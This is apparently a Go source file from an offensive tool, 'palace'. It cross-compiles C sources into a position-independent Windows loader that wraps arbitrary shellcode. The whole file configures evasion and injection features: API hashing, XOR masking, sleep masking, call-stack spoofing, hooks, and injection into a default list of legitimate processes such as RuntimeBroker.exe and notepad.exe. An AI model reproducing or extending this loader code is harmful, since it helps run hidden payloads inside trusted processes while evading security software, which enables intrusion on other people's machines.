package palace

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

//go:embed default.spec
var defaultSpec string

// DefaultSpec returns the canonical loader spec.
func DefaultSpec() string { return defaultSpec }

// Options selects the loader features baked into one palace build.
type Options struct {
	Shellcode []byte
	SrcDir    string // C sources (unity.c, headers)
	ObjDir    string // compile output; load/run paths resolve here
	SpecPath  string // custom spec file, or "" for the default
	MaskLen   int
	XOR       bool
	// ExtraDefs appends raw -D flags to the unity compile (tests).
	ExtraDefs []string
	PICO      string // "stub" or "none"
	ROR13     bool
	NoRWX     bool
	CFG       bool
	Cleanup   bool
	Hooks     bool
	SleepMask bool
	Spoof     bool
	Inject    string // "self" or "host"
	Hosts     string // comma-separated fallback order
	CC        string // cross compiler, default x86_64-w64-mingw32-gcc
}

func (o Options) compiler() string {
	if o.CC != "" {
		return o.CC
	}
	return "x86_64-w64-mingw32-gcc"
}

// Defines maps options to -D flags for the unity build.
func (o Options) Defines() ([]string, error) {
	d := []string{"-DWIN_X64"}
	if o.ROR13 {
		d = append(d, "-DPALACE_ROR13")
	} else {
		d = append(d, "-DPALACE_NO_ROR13")
	}
	if o.NoRWX {
		d = append(d, "-DPALACE_NO_RWX")
	} else {
		d = append(d, "-DPALACE_RWX")
	}
	if o.CFG {
		d = append(d, "-DPALACE_CFG")
	}
	if o.Cleanup {
		d = append(d, "-DPALACE_CLEANUP")
	}
	if o.XOR {
		d = append(d, "-DPALACE_XOR")
	} else {
		d = append(d, "-DPALACE_NO_XOR")
	}
	if o.PICO == "none" {
		d = append(d, "-DPALACE_PICO_NONE")
	}
	if o.Hooks {
		d = append(d, "-DPALACE_HOOKS")
	}
	if o.SleepMask {
		d = append(d, "-DPALACE_SLEEPMASK")
	}
	if o.Spoof {
		d = append(d, "-DPALACE_SPOOF")
	}
	switch o.Inject {
	case "self":
	case "host":
		d = append(d, "-DPALACE_INJECT_HOST")
	default:
		return nil, fmt.Errorf("bad inject mode %q", o.Inject)
	}
	hosts := o.Hosts
	if hosts == "" {
		hosts = "RuntimeBroker.exe,SgrmBroker.exe,WerFault.exe,dllhost.exe,notepad.exe"
	}
	for _, c := range hosts {
		if !(c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || c >= '0' && c <= '9' || c == '.' || c == ',' || c == '_' || c == '-') {
			return nil, fmt.Errorf("bad character %q in palace_hosts", c)
		}
	}
	d = append(d, `-DPALACE_HOSTS="`+hosts+`"`)
	return d, nil
}

// Compile builds the unity object with the cross compiler. The unity
// build (one translation unit) avoids MinGW .refptr/ADDR64 absolute
// indirection, which cannot work in PIC shellcode. -Wno-array-bounds
// quiets the zero-length GETRESOURCE markers the linker fills.
// -ffunction-sections/-fdata-sections give every function and global
// its own section, so +gofirst orders whole sections (the compiler
// pre-resolves intra-section calls with no relocs, which byte
// rotation would corrupt).
func (o Options) Compile() error {
	defs, err := o.Defines()
	if err != nil {
		return err
	}
	if err := CheckServiceHeader(filepath.Join(o.SrcDir, "services.h")); err != nil {
		return err
	}
	args := append([]string{}, defs...)
	args = append(args, o.ExtraDefs...)
	args = append(args,
		"-shared", "-Wall", "-Wno-array-bounds", "-Os",
		"-ffreestanding", "-fno-builtin", "-fno-stack-protector",
		"-fno-asynchronous-unwind-tables", "-fno-ident",
		"-fno-omit-frame-pointer",
		"-ffunction-sections", "-fdata-sections",
		"-c", "unity.c", "-o", filepath.Join(o.ObjDir, "loader.x64.o"),
	)
	cmd := exec.Command(o.compiler(), args...)
	cmd.Dir = o.SrcDir
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s: %w\n%s", o.compiler(), err, strings.TrimSpace(string(out)))
	}
	return nil
}

// specText returns the effective spec: custom file verbatim, or the
// default parameterized with the mask length and XOR toggle.
func (o Options) specText() (string, error) {
	if o.SpecPath != "" {
		raw, err := os.ReadFile(o.SpecPath)
		if err != nil {
			return "", err
		}
		return string(raw), nil
	}
	var kept []string
	for _, line := range strings.Split(defaultSpec, "\n") {
		t := strings.TrimSpace(line)
		if strings.HasPrefix(t, "generate $MASK ") {
			kept = append(kept, fmt.Sprintf("    generate $MASK %d", o.MaskLen))
			continue
		}
		if t == "xor $MASK" && !o.XOR {
			continue
		}
		kept = append(kept, line)
	}
	return strings.Join(kept, "\n"), nil
}

// Build evaluates the spec over the compiled objects and assembles
// the PIC blob. Run Compile first (or stage loader.x64.o by hand).
func (o Options) Build() ([]byte, error) {
	if o.MaskLen < 16 || o.MaskLen > 512 {
		return nil, fmt.Errorf("mask length %d out of range 16-512", o.MaskLen)
	}
	if o.PICO != "stub" && o.PICO != "none" {
		return nil, fmt.Errorf("bad PICO mode %q", o.PICO)
	}
	text, err := o.specText()
	if err != nil {
		return nil, err
	}
	ev := NewEvaluator(o.ObjDir, o.Shellcode, o.PICO == "stub")
	if err := ev.Eval(text); err != nil {
		return nil, err
	}
	return ev.Assembly()
}
